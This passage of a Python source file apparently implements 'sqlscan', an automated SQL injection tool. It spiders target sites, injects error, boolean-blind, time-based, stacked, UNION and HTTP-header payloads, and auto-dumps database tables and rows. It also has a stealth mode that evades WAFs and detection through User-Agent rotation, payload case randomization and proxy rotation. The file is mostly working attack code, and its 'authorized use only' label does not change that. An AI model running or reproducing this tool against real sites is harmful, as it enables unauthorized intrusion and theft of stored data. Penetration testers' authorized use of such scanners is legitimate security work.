        len_true  = len(r_true.text)
        len_false = len(r_false.text)
        len_base  = len(baseline_text) if baseline_text else 0

        # True response close to baseline, false response differs significantly
        diff_tf = abs(len_true - len_false)
        diff_tb = abs(len_true - len_base)
        if diff_tf > 50 and diff_tb < diff_tf * 0.4:
            return (true_p, false_p), "Boolean-based blind", (
                f"Response length TRUE={len_true} FALSE={len_false} "
                f"BASE={len_base} (diff={diff_tf})"
            )

        # Title / body keyword divergence (page says "no results" vs content)
        title_true  = re.search(r"<title[^>]*>(.*?)</title>", r_true.text,  re.I | re.S)
        title_false = re.search(r"<title[^>]*>(.*?)</title>", r_false.text, re.I | re.S)
        if title_true and title_false and title_true.group(1) != title_false.group(1):
            return (true_p, false_p), "Boolean-based blind", (
                f"Page title differs: TRUE={title_true.group(1)!r} "
                f"FALSE={title_false.group(1)!r}"
            )

        sleep_jitter(delay)
    return None, None, None

def check_time_based(session, method, url, param, base_params, base_data,
                     timeout, delay, sleep_sec=5):
    """Inject time-delay payloads; detect if response takes >= sleep_sec."""
    for template, hint_dbms in TIME_PAYLOADS:
        payload = template.format(s=sleep_sec)
        t0 = time.time()
        if method == "GET":
            tp = dict(base_params); tp[param] = base_params.get(param, "") + mutate_payload(payload)
            r = send(session, "GET", url, params=tp,
                     timeout=max(timeout, sleep_sec + 5))
        else:
            td = dict(base_data); td[param] = base_data.get(param, "") + mutate_payload(payload)
            r = send(session, "POST", url, data=td,
                     timeout=max(timeout, sleep_sec + 5))
        elapsed = time.time() - t0

        if elapsed >= sleep_sec * 0.9:
            return payload, hint_dbms, f"Response delayed {elapsed:.1f}s (expected {sleep_sec}s)"

        sleep_jitter(delay)
    return None, None, None

# ─── Union Detection ─────────────────────────────────────────────────────────

def detect_union_columns(session, method, url, param, base_params, base_data,
                         timeout, delay, max_cols=20, dbms=None, dump=False,
                         max_tables=5, max_columns=20, max_rows=10):
    """ORDER BY technique to find column count, then extract DB data via UNION SELECT."""
    for n in range(1, max_cols + 1):
        for template in UNION_ORDER_BY:
            payload = template.format(n=n)
            if method == "GET":
                tp = dict(base_params); tp[param] = base_params.get(param, "") + mutate_payload(payload)
                r = send(session, "GET", url, params=tp, timeout=timeout)
            else:
                td = dict(base_data); td[param] = base_data.get(param, "") + mutate_payload(payload)
                r = send(session, "POST", url, data=td, timeout=timeout)

            if not r:
                continue
            err = detect_dbms_from_error(r.text)
            if not err:
                # This comment style is valid for this DBMS and ORDER BY n didn't
                # error — no need to try the other comment variants at this n
                # (e.g. '#' isn't a comment outside MySQL and would falsely "error").
                break
            if n > 1:
                col_count = n - 1
                log_ok(f"  UNION column count: {col_count}")
                _, string_col = union_extract_data(
                    session, method, url, param, base_params, base_data,
                    col_count, dbms, timeout, delay,
                )
                db_dump = {}
                if dump and string_col is not None:
                    db_dump = union_dump_database(
                        session, method, url, param, base_params, base_data,
                        col_count, string_col, dbms, timeout, delay,
                        max_tables=max_tables, max_columns=max_columns, max_rows=max_rows,
                    )
                return col_count, payload, db_dump
        sleep_jitter(delay)
    return None, None, {}

# ─── Main Scanner ─────────────────────────────────────────────────────────────

class SQLScanner:
    def __init__(self, args):
        self.args         = args
        self.retry_conn   = getattr(args, "retry_conn", 3)
        self.session      = make_session(
            proxy=args.proxy,
            proxy_list=load_proxy_list(args.proxy_list),
            timeout=args.timeout,
            headers=self._parse_headers(args.headers),
        )
        self.result  = ScanResult(target=args.url)

    def _parse_headers(self, raw):
        if not raw:
            return {}
        h = {}
        for item in raw:
            if ":" in item:
                k, _, v = item.partition(":")
                h[k.strip()] = v.strip()
        return h

    def _scan_param(self, method, url, param, base_params, base_data):
        log_info(f"Testing param [{CYN}{param}{RESET}] via {method}")
        self.result.tested_params.append(param)

        baseline_text, _, _ = get_baseline(
            self.session, method, url, base_params, base_data, self.args.timeout
        )

        found_dbms = None  # carry discovered DBMS into later techniques

        # 1. Error-based
        if not self.args.technique or "E" in self.args.technique.upper():
            payload, dbms, evidence = check_error_based(
                self.session, method, url, param,
                base_params, base_data, baseline_text,
                self.args.timeout, self.args.delay,
            )
            if payload:
                found_dbms = dbms
                f = Finding(url, param, method, "Error-based", dbms, payload, evidence)
                self.result.findings.append(f)
                log_vuln(f"param={BOLD}{param}{RESET} | technique=Error-based"
                         f" | DBMS={dbms or '?'} | payload={YLW}{payload}{RESET}")
                log_vuln(f"  Evidence: {evidence}")
                if not self.args.level or self.args.level < 2:
                    return  # stop after first hit unless deep mode
            else:
                # Standard probes found nothing — try WAF-bypass obfuscations
                payload, dbms, evidence = check_waf_bypass(
                    self.session, method, url, param,
                    base_params, base_data, baseline_text,
                    self.args.timeout, self.args.delay,
                )
                if payload:
                    found_dbms = dbms
                    f = Finding(url, param, method, "Error-based (WAF bypass)",
                                dbms, payload, evidence)
                    self.result.findings.append(f)
                    log_vuln(f"param={BOLD}{param}{RESET} | technique=Error-based (WAF bypass)"
                             f" | DBMS={dbms or '?'} | payload={YLW}{payload}{RESET}")
                    log_vuln(f"  Evidence: {evidence}")
                    if not self.args.level or self.args.level < 2:
                        return

        # 2. Boolean-based blind
        if not self.args.technique or "B" in self.args.technique.upper():
            result, technique, evidence = check_boolean_based(
                self.session, method, url, param,
                base_params, base_data, baseline_text,
                self.args.timeout, self.args.delay,
            )
            if result:
                f = Finding(url, param, method, "Boolean-based blind",
                            None, str(result), evidence)
                self.result.findings.append(f)
                log_vuln(f"param={BOLD}{param}{RESET} | technique=Boolean-blind"
                         f" | payloads={YLW}{result}{RESET}")
                log_vuln(f"  Evidence: {evidence}")
                if not self.args.level or self.args.level < 2:
                    return

        # 3. Time-based blind
        if not self.args.technique or "T" in self.args.technique.upper():
            payload, dbms, evidence = check_time_based(
                self.session, method, url, param,
                base_params, base_data, self.args.timeout,
                self.args.delay, sleep_sec=self.args.time_sec,
            )
            if payload:
                f = Finding(url, param, method, "Time-based blind",
                            dbms, payload, evidence)
                self.result.findings.append(f)
                log_vuln(f"param={BOLD}{param}{RESET} | technique=Time-blind"
                         f" | DBMS={dbms or '?'} | payload={YLW}{payload}{RESET}")
                log_vuln(f"  Evidence: {evidence}")

        # 4. Stacked queries
        if not self.args.technique or "S" in self.args.technique.upper():
            payload, dbms, evidence = check_stacked_queries(
                self.session, method, url, param,
                base_params, base_data,
                self.args.timeout, self.args.delay, sleep_sec=self.args.time_sec,
            )
            if payload:
                found_dbms = found_dbms or dbms
                f = Finding(url, param, method, "Stacked queries",
                            dbms, payload, evidence)
                self.result.findings.append(f)
                log_vuln(f"param={BOLD}{param}{RESET} | technique=Stacked-queries"
                         f" | DBMS={dbms or '?'} | payload={YLW}{payload}{RESET}")
                log_vuln(f"  Evidence: {evidence}")

        # 5. UNION column detection + data extraction + auto dump
        if self.args.level and self.args.level >= 3:
            if not self.args.technique or "U" in self.args.technique.upper():
                cols, p, db_dump = detect_union_columns(
                    self.session, method, url, param,
                    base_params, base_data, self.args.timeout, self.args.delay,
                    dbms=found_dbms, dump=self.args.dump,
                    max_tables=self.args.dump_tables, max_rows=self.args.dump_rows,
                )
                if cols:
                    log_ok(f"UNION column count for [{param}]: {cols} (via {p})")
                if db_dump:
                    self.result.dumps.append({
                        "url": url, "param": param, "method": method,
                        "dbms": found_dbms, "tables": db_dump,
                    })

    def _scan_target(self, t: "SpiderTarget"):
        """Scan all parameters in a SpiderTarget."""
        params_to_test = list(t.params) if t.method == "GET" else list(t.data)
        for param in params_to_test:
            self._scan_param(t.method, t.url, param, t.params, t.data)

    def _scan_headers(self, url):
        """Technique H: inject SQLi payloads into HTTP headers."""
        if self.args.technique and "H" not in self.args.technique.upper():
            return
        log_info("Testing HTTP header injection...")
        findings = check_header_injection(self.session, url, self.args.timeout, self.args.delay)
        for hit in findings:
            f = Finding(url, hit["header"], "HEADER", "Header injection",
                        hit["dbms"], hit["payload"], hit["evidence"])
            self.result.findings.append(f)
            log_vuln(f"header={BOLD}{hit['header']}{RESET} | technique=Header-injection"
                     f" | DBMS={hit['dbms']} | payload={YLW}{hit['payload']}{RESET}")
            log_vuln(f"  Evidence: {hit['evidence']}")

    def run(self):
        url = self.args.url

        self._scan_headers(url)

        # ── Auto-spider mode ─────────────────────────────────────────────────
        if self.args.crawl:
            print()
            targets = spider(
                self.session, url,
                max_depth=self.args.crawl_depth,
                max_urls=self.args.max_urls,
                timeout=self.args.timeout,
                delay=self.args.delay,
            )
            self.result.urls_crawled = len(targets)
            if not targets:
                log_warn("Spider found no URLs with parameters — check the target URL")
            else:
                print()
                log_info(f"Starting injection tests on {len(targets)} target(s)...")
                print()
                for t in targets:
                    self._scan_target(t)
            self._report()
            return

        # ── Manual mode (single URL / POST data) ─────────────────────────────

        # GET params from URL
        url_params = extract_url_params(url)
        post_data_from_arg: Dict[str, str] = {}

        if self.args.data:
            for pair in self.args.data.split("&"):
                if "=" in pair:
                    k, _, v = pair.partition("=")
                    post_data_from_arg[k] = v

        # ── Interactive fallback when nothing is found ────────────────────────
        if not url_params and not post_data_from_arg and not self.args.crawl_forms:
            log_warn("Aucun paramètre détecté dans l'URL ni en POST.")
            manual_get, manual_post = prompt_manual_params()
            if manual_get:
                url_params = manual_get
            if manual_post:
                post_data_from_arg = manual_post
            if not url_params and not post_data_from_arg:
                log_warn("Aucun paramètre saisi — scan annulé.")
                self._report()
                return

        if url_params:
            log_info(f"Paramètres GET ({len(url_params)}) : "
                     f"{', '.join(url_params)}")
            for param in url_params:
                self._scan_param("GET", url, param, dict(url_params), {})
        else:
            log_warn("Aucun paramètre GET détecté dans l'URL")

        if post_data_from_arg:
            log_info(f"Paramètres POST : {', '.join(post_data_from_arg)}")
            for param in post_data_from_arg:
                self._scan_param("POST", url, param, {}, dict(post_data_from_arg))

        # Form crawling (single page)
        if self.args.crawl_forms:
            log_info("Crawling forms on target page...")
            forms = crawl_forms(self.session, url, self.args.timeout)
            log_info(f"Found {len(forms)} form(s)")
            for form in forms:
                for param in form["data"]:
                    self._scan_param(
                        form["method"], form["url"], param,
                        {}, dict(form["data"]),
                    )

        self._report()

    def _report(self):
        elapsed = time.time() - self.result.start_time
        print(f"\n{'─'*60}")
        print(f"{BOLD}SCAN COMPLETE{RESET}  target={self.result.target}")
        if self.result.urls_crawled:
            print(f"  Targets found : {self.result.urls_crawled}")
        print(f"  Params tested : {len(self.result.tested_params)}")
        print(f"  Findings      : {len(self.result.findings)}")
        print(f"  Elapsed       : {elapsed:.1f}s")

        if self.result.findings:
            print(f"\n{RED}{BOLD}[!] VULNERABLE PARAMETERS FOUND:{RESET}")
            for i, f in enumerate(self.result.findings, 1):
                print(f"  {i}. {BOLD}{f.param}{RESET} ({f.method})")
                print(f"     Technique : {f.technique}")
                print(f"     DBMS      : {f.dbms or 'Unknown'}")
                print(f"     Payload   : {YLW}{f.payload}{RESET}")
                print(f"     Evidence  : {f.evidence}")
        else:
            print(f"\n{GRN}No SQL injection found (tested techniques: "
                  f"{self.args.technique or 'EBT'}){RESET}")

        if self.result.dumps:
            print(f"\n{MAG}{BOLD}[+] DATABASE DUMP:{RESET}")
            for d in self.result.dumps:
                print(f"  {BOLD}{d['param']}{RESET} ({d['method']}) — DBMS={d['dbms'] or 'Unknown'}")
                for table, info in d["tables"].items():
                    print(f"   {CYN}Table: {table}{RESET}  columns: {', '.join(info['columns'])}")
                    for row in info["rows"]:
                        print(f"     - {row}")

        if self.args.output:
            out = {
                "target": self.result.target,
                "findings": [
                    {
                        "param": f.param, "method": f.method,
                        "technique": f.technique, "dbms": f.dbms,
                        "payload": f.payload, "evidence": f.evidence,
                    }
                    for f in self.result.findings
                ],
                "dumps": self.result.dumps,
            }
            with open(self.args.output, "w") as fh:
                json.dump(out, fh, indent=2)
            log_ok(f"Results saved to {self.args.output}")
        print('─'*60)

# ─── CLI ─────────────────────────────────────────────────────────────────────

def parse_args():
    p = argparse.ArgumentParser(
        prog="sqlscan",
        description="Automated SQL Injection Scanner — authorized use only",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Auto-spider the whole site and test every found parameter
  python sqlscan.py -u "http://target.local/" --crawl

  # Spider with deeper crawl, more pages, save report
  python sqlscan.py -u "http://target.local/" --crawl --crawl-depth 5 --max-urls 200 -o report.json

  # Single URL with a known GET param
  python sqlscan.py -u "http://target.local/page?id=1"

  # Single URL POST form
  python sqlscan.py -u "http://target.local/login" --data "user=admin&pass=x"

  # Crawl forms on one page + route through Burp
  python sqlscan.py -u "http://target.local/page?id=1" --crawl-forms --proxy http://127.0.0.1:8080
        """,
    )
    p.add_argument("-u", "--url",          required=True, help="Target URL (start point)")
    p.add_argument("--data",               help="POST data (e.g. 'user=a&pass=b')")
    p.add_argument("-t", "--technique",    default="EBTSH",
                   help="Techniques: E=error B=boolean T=time U=union S=stacked H=header (default EBTSH)")
    p.add_argument("-A", "--all",          action="store_true",
                   help="Enable all techniques (EBTUSH) at level 3 — shorthand for -t EBTUSH -l 3")
    p.add_argument("-l", "--level",        type=int, default=1,
                   help="Scan level 1-3 (1=stop at first hit, 3=thorough)")

    # ── Spider / auto-find options ───────────────────────────────────────────
    spider_grp = p.add_argument_group("Spider (auto-find parameters)")
    spider_grp.add_argument(
        "--crawl", action="store_true",
        help="Spider the site to auto-discover all URLs with parameters, then scan them",
    )
    spider_grp.add_argument(
        "--crawl-depth", type=int, default=3, metavar="N",
        help="Max link depth when spidering (default 3)",
    )
    spider_grp.add_argument(
        "--max-urls", type=int, default=100, metavar="N",
        help="Max pages to fetch during spider (default 100)",
    )
    spider_grp.add_argument(
        "--crawl-forms", action="store_true",
        help="Also crawl and test HTML forms on the single target page (no spider)",
    )

    # ── Auto DB dump (built on the UNION technique) ─────────────────────────
    dump_grp = p.add_argument_group("Auto DB dump (requires UNION injection)")
    dump_grp.add_argument(
        "--dump", action="store_true",
        help="Auto-dump table/column names + sample rows once UNION injection is confirmed "
             "(implies -t U and -l 3 if not already set)",
    )
    dump_grp.add_argument(
        "--dump-tables", type=int, default=5, metavar="N",
        help="Max number of tables to dump (default 5)",
    )
    dump_grp.add_argument(
        "--dump-rows", type=int, default=10, metavar="N",
        help="Max rows per table to dump (default 10)",
    )

    p.add_argument("--proxy",              help="HTTP proxy (e.g. http://127.0.0.1:8080)")
    p.add_argument("--proxy-list",         metavar="FILE|LIST",
                   help="Rotate through multiple proxies — either a file (one proxy per line) "
                        "or a comma-separated list (e.g. 'http://p1:8080,http://p2:8080'). "
                        "Overrides --proxy if both are given.")
    p.add_argument("--timeout",            type=int, default=10, help="Request timeout (s)")
    p.add_argument("--delay",              type=float, default=0.2,
                   help="Delay between requests in seconds (default 0.2)")
    p.add_argument("--time-sec",           type=int, default=5,
                   help="Seconds for time-based payloads (default 5)")
    p.add_argument("--retry-conn",         type=int, default=3, metavar="N",
                   help="Nombre de tentatives en cas de connexion refusée (default 3)")
    p.add_argument("-H", "--headers",      action="append",
                   metavar="HEADER",
                   help="Custom header (e.g. 'Cookie: sess=abc') — repeatable")
    p.add_argument("--stealth",            action="store_true",
                   help="Auto detection-evasion: rotate real browser User-Agents, jitter request "
                        "delays, and randomize SQL keyword case + inline-comment payloads "
                        "(same techniques as sqlmap's randomcase/space2comment tampers)")
    p.add_argument("-o", "--output",       help="Save JSON report to file")
    p.add_argument("--no-banner",          action="store_true", help="Suppress banner")
    return p.parse_args()

def check_deps():
    if not HAS_DEPS:
        print("Missing dependencies. Run:")
        print("  pip install requests beautifulsoup4")
        sys.exit(1)

def main():
    global _CONN_RETRIES, _STEALTH
    args = parse_args()
    if not args.no_banner:
        banner()
    check_deps()

    if args.all:
        args.technique = "EBTUSH"
        args.level = 3

    if args.dump:
        if "U" not in args.technique.upper():
            args.technique += "U"
        if args.level < 3:
            args.level = 3

    _CONN_RETRIES = args.retry_conn
    _STEALTH = args.stealth
    if _STEALTH:
        log_info("Stealth mode: UA rotation + jittered delays + randomized payload case/comments")

    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    # ── URL validation + retry loop ──────────────────────────────────────────
    current_url = args.url
    while True:
        if not current_url.startswith(("http://", "https://")):
            log_err("L'URL doit commencer par http:// ou https://")
            new = prompt_new_url()
            if not new:
                sys.exit(1)
            current_url = new
            continue

        # Quick connectivity probe before launching the full scan
        import requests as _req
        try:
            _probe_session = make_session(
                proxy=args.proxy, proxy_list=load_proxy_list(args.proxy_list),
                timeout=args.timeout,
            )
            _probe_session.get(current_url, timeout=args.timeout)
        except _req.exceptions.ConnectionError:
            log_err(f"Impossible de se connecter à {current_url}")
            new = prompt_new_url()
            if not new:
                log_warn("Abandon.")
                sys.exit(1)
            current_url = new
            continue
        except Exception:
            pass  # other errors are handled by send() during scan
        break

    args.url = current_url
    log_info(f"Cible      : {args.url}")
    log_info(f"Mode       : {'AUTO-SPIDER' if args.crawl else 'URL unique'}")
    log_info(f"Techniques : {args.technique}  Niveau : {args.level}")
    log_info(f"Retry conn : {_CONN_RETRIES} tentative(s)")
    print()

    scanner = SQLScanner(args)
    scanner.run()

if __name__ == "__main__":
    main()
